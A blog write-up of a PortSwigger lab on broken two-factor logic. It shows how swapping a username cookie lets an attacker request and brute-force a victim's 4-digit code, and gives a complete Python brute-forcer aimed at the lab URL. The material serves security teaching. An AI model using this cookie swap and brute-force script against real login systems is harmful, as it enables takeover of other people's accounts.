+++
title = "Authentication Vulnerabilities: Lab 7: 2FA broken logic"
date = 2025-11-07
lastmod = 2025-11-07
draft = false
author = "bloodstiller"
description = "PortSwigger authentication lab write-up how to bypass via bruteforce 2FA/MFA "
tags = [
  "WebSecurity",
  "PortSwigger",
  "web-exploitation",
  "security-research",
  "authentication",
  "login",
  "username-enumeration",
  "response-timing",
  "portswigger-labs",
  "ctf-writeup",
  "2FA",
  "MFA",
  "python",
  "2FA-bypass"
]
keywords = [
  "authentication vulnerabilities",
  "timing attacks",
  "PortSwigger authentication lab",
  "web security",
  "login brute force",
  "side-channel analysis",
  "2FA"
]
toc = true
bold = true
next = true
+++

## Lab 7: 2FA broken logic: {#lab-7-2fa-broken-logic}

> This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page.
>
> Your credentials: wiener:peter
> Victim's username: carlos
>
> You also have access to the email server to receive your 2FA verification code.


### Initial Reconnaissance/Discovery: {#initial-reconnaissance-discovery}

We have a standard login page as usual and access to an email server to receive our 2FA codes for our user.

Let's login to view the process.

We are now prompted for our 2FA code.
![](/ox-hugo/2025-11-06_10-42.png)

Let's get our 2FA code from the email client.
![](/ox-hugo/2025-11-06_10-41.png)

We are now logged in.
![](/ox-hugo/2025-11-06_10-43.png)


### Breaking Down Authentication Flow: {#breaking-down-authentication-flow}


#### /login {#login}

So we can see what is going on at the back end let's break down the complete authentication flow by following it in burp.

If we look at our initial `POST` request of when we send our username &amp; password we can see we get a 302 (redirect) to hit the endpoint `/login2` and we can also see a cookie is set to the value of our username.

```http
Set-Cookie: verify=wiener
```

{{< figure src="/ox-hugo/2025-11-06_10-45.png" >}}


#### /login2 {#login2}

Looking at the `POST` request for the endpoint `/login2` where we supply our 2FA token we can see that we are passing the cookie with our name value, that was set previously, as well as the 2FA-code.
![](/ox-hugo/2025-11-06_10-51.png)

**Weakness in the logic**: Looking at this authentication flow we should be able to send the second request to intruder and set the cookie value to the name of the user we want to login as "carlos", once this is done we should be able to then brute force the 2FA code.


### Exploiting Flawed Login Logic To Bruteforce A Valid 2FA Code: {#exploiting-flawed-login-logic-to-bruteforce-a-valid-2fa-code}

+Disclaimer+: So this took me a while to figure out as initially I just sent the `POST` request for `/login2` to intruder and modified the cookie value to be "carlos'" name and bruteforced the 2FA code however this was not working; I was just getting standard `200` responses when I should of in-fact been getting `302` responses. This was when I realised "carlos" had not had a valid 2FA code issued. As we had not requested a 2FA code for "carlos" it would always fail as trying to bruteforce a value that doesn't exist will never work. Instead what we need to do is trigger the website to generate an 2FA code for "carlos'" account and then bruteforce the 2FA code.


#### Requesting A 2FA Code For Carlos: {#requesting-a-2fa-code-for-carlos}

First let's take the original `GET` request for `/login2` and send this to repeater.
![](/ox-hugo/2025-11-06_11-13.png)

Now we modify the cookie value to contain "carlos'" name and send it, this will cause the site to generate a 2FA code for "carlos", which should be sent via email to him.
![](/ox-hugo/2025-11-06_11-19.png)


#### Bruteforcing The 2FA Code Using Burp: {#bruteforcing-the-2fa-code-using-burp}

Now we can bruteforce the code by taking our valid `POST` request for `/login2` and sending it to intruder.
![](/ox-hugo/2025-11-06_11-16.png)

We set the injection point to be the `mfa-code` value and also modify the cookie to contain "carlos'" name the value. For our payloads we can set the type as "number" and then set the values listed in the image, this ensures we step through every number from 0001 to 9999.
![](/ox-hugo/2025-11-06_11-22.png)

+Note+: The "Numbers" option is only available on burp pro &amp; iterating through 9999 possible combinations will take a long while if using a burp community edition, so we can also script this in python too, which I will show.

Once we start our attack we can set our status code filter so that `302`'s are at the top and we get a hit, meaning we have a valid code of `0808`.
![](/ox-hugo/2025-11-06_11-23.png)


#### Bruteforcing The 2FA Code Using Python: {#bruteforcing-the-2fa-code-using-python}

As I said above doing this with the community edition of burp will take a LONG time as they purposely throttle the requests intruder can make. There are ways around this, such as copying the `POST` request and using FFUF to bruteforce whilst proxying through burp, or proxying ZAP through burp (which does not limit requests), or scripting this ourselves in python and proxying through burp.

My python has gotten a little rusty as of late as I had found myself becoming a bit too reliant on LLM models for scripting basic things, so I have stopped using LLM's for this as I want ensure I stay sharp. (If you use LLM's that's fine but for me I found I was losing my edge) so brace yourself for some ugly, sloppy yet still functional code.


##### Prep The Certificate: {#prep-the-certificate}

If you want to proxy traffic through burp this is mandatory.

Open burp's in built web browser and go to <http://burpsuite> &amp; download the certificate by clicking on “CA Certificate” button on the top right corner.
![](/ox-hugo/2025-11-06_05-56.png)

Convert the certificate to the `.pem` format so the python requests module can use it.

```shell
openssl x509 -inform der -in certificate.cer -out certificate.pem
```


##### Python 2FA Bruteforcer: {#python-2fa-bruteforcer}

```python
import requests
import os
import time
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
proxy = 'http://127.0.0.1:8080'
os.environ['HTTP_PROXY'] = proxy
os.environ['HTTPS_PROXY'] = proxy
os.environ['REQUESTS_CA_BUNDLE'] = "certificate.pem"

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
url="https://0afe00ec0370f1d6803adffc003c002f.web-security-academy.net/login2"
cookies={'verify' : 'carlos', 'session' : 'Z1XthxXeEPetLSeXVTNQIEeRhZtuH2xv'}

for i in range(9999):
    MFA=(f'{i:04}')
    try:
        request=requests.post(url, proxies=proxies, cookies=cookies, verify=False, timeout=3, data={
            'mfa-code': MFA
        })
        if request.status_code == 302:
            print(MFA)
    except requests.exceptions.HTTPError as errh:
        print ("Http Error:",errh)
    except requests.exceptions.ConnectionError as errc:
        print ("Error Connecting:",errc)
    except requests.exceptions.Timeout as errt:
        print ("Timeout Error:",errt)
    except requests.exceptions.RequestException as err:
        print ("OOps: Something Else",err)

```


##### Code Breakdown: {#code-breakdown}

For all you nerds out there let's break this down.

<!--list-separator-->

-  Imports:

    First we import the modules we will need, `requests` &amp; `os`. We also suppress the `requests` warning that will show

    ```python
    import requests
    import os
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
    ```

    If we didn't suppress the warnings the output would look like this.
    ![](/ox-hugo/2025-11-06_06-02.png)

<!--list-separator-->

-  Proxy Setup:

    Now we declare our proxy so we can push all our traffic through burp, we also pass in the converted certificate.

    ```python
    proxy = 'http://127.0.0.1:8080'
    os.environ['HTTP_PROXY'] = proxy
    os.environ['HTTPS_PROXY'] = proxy
    os.environ['REQUESTS_CA_BUNDLE'] = "certificate.pem"
    ```

<!--list-separator-->

-  Variable Declaration:

    We declare an array of proxies to pass to our requests as well as the unique url for our lab's login page as this is where we will be sending requests.

    Cookies: We need to grab the cookie values from a valid request and change the name to be "carlos" as opposed to "wiener"
    ![](/ox-hugo/2025-11-07_05-39.png)
    +Note+: Ignore that the values for the session are different, I forgot to take a screenshot at the time of writing the code.

    ```python
    proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
    url="https://0afe00ec0370f1d6803adffc003c002f.web-security-academy.net/login2"
    cookies={'verify' : 'carlos', 'session' : 'Z1XthxXeEPetLSeXVTNQIEeRhZtuH2xv'}
    ```

<!--list-separator-->

-  Main Logic:

    <!--list-separator-->

    -  **Create A Simple Loop For 9999 Iterations**:

        We use the `i in range` syntax to iterate through `9999` iterations.

        `MFA=(f'{i:04}')`: We then set the value of the variable `MFA` to that of `i` but with three `0`'s preceding it, we do this as if we didn't we would just get numbers like `1` as opposed to `0001` and the format of the 2FA code is 4 digits. Some of you may have realised that this value we are creating is a string, however it doesn't matter as we are passing it in the request body. we are passing it in the request body.

        We then use a `try/except` block to send our request with the cookies, proxy details and `mfa-code` in the body.

        ```python
        for i in range(9999):
            MFA=(f'{i:04}')
            try:
                request=requests.post(url, proxies=proxies, cookies=cookies, verify=False, timeout=3, data={
                    'mfa-code': MFA
                })
        ```

    <!--list-separator-->

    -  **Notify On Event Of 302 Response**:

        This should respond with just the MFA code in the console on the event a 302 is returned, however it just did not do it and I ended up filtering in burp.

        ```python
                if request.status_code == 302:
                    print(MFA)
        ```

    <!--list-separator-->

    -  **Error Handling**:

        These `except` clauses are used for error handling, which is needed as otherwise it can error out (see image below)

        ```python
            except requests.exceptions.HTTPError as errh:
                print ("Http Error:",errh)
            except requests.exceptions.ConnectionError as errc:
                print ("Error Connecting:",errc)
            except requests.exceptions.Timeout as errt:
                print ("Timeout Error:",errt)
            except requests.exceptions.RequestException as err:
                print ("OOps: Something Else",err)
        ```

        Here is the `ConnectionError` exception being triggered, this seemed to happen every 1500 requests or so.
        ![](/ox-hugo/2025-11-07_05-50.png)


##### 2FA code found Via Manual 2FA Brutforcer: {#2fa-code-found-via-manual-2fa-brutforcer}

If we run the code we can see it works as we get a `302` response in burp, and that our 2FA code has a value of `1989`.

{{< figure src="/ox-hugo/2025-11-07_05-33.png" >}}

+Note+: I scripted this after I had already completed the lab so the discovered 2FA code is different to the one I found via burp.


### Logging In As Carlos: {#logging-in-as-carlos}

Now that we have our code we actually need to login as "carlos". To do this we will need to **intercept** valid requests and modify them in transit.

First we login as normal with our user "wiener" then when we get to the 2FA request we modify the cookie to contain "carlos" &amp; we supply the 2FA token `0808`.
![](/ox-hugo/2025-11-06_11-26_1.png)

Now the important part after we modify the previous request and send it on we will we make our request for the `/my-account?id=[username]` endpoint. For this we need to ensure we set the cookie value again to "carlos" and the forward the request.
![](/ox-hugo/2025-11-06_11-29.png)

Once done if we reload our page in our browser we can see we are logged in as "carlos" &amp; we have solved the lab.
![](/ox-hugo/2025-11-06_11-31.png)
